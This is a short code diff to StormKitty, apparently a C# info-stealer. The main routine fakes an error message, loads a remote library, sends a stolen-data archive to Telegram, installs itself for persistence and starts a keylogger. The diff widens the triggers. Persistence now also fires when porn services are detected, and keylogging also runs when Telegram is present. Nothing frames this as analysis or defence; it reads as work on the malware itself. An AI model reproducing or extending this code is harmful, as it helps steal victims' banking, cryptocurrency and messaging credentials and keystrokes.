@@ -39,7 +39,7 @@ namespace StormKitty
                 Implant.AntiAnalysis.FakeErrorMessage();
 
             // Change working directory to appdata
-            System.IO.Directory.SetCurrentDirectory(Paths.lappdata);
+            System.IO.Directory.SetCurrentDirectory(Paths.InitWorkDir());
 
             // Load SharpZipLib
             if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
@@ -60,12 +60,12 @@ namespace StormKitty
             Telegram.Report.SendReport(archive);
 
             // Install to startup if enabled in config and not installed
-            if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices))
+            if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
                 if (!Implant.Startup.IsInstalled() && !Implant.Startup.IsFromStartup())
                     Implant.Startup.Install();
 
             // Run keylogger module
-            if (Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1")
+            if (Config.KeyloggerModule == "1" && (Counter.BankingServices || Counter.Telegram) && Config.Autorun == "1")
             {
                 Console.WriteLine("Starting keylogger modules...");
                 W_Thread = WindowManager.MainThread;
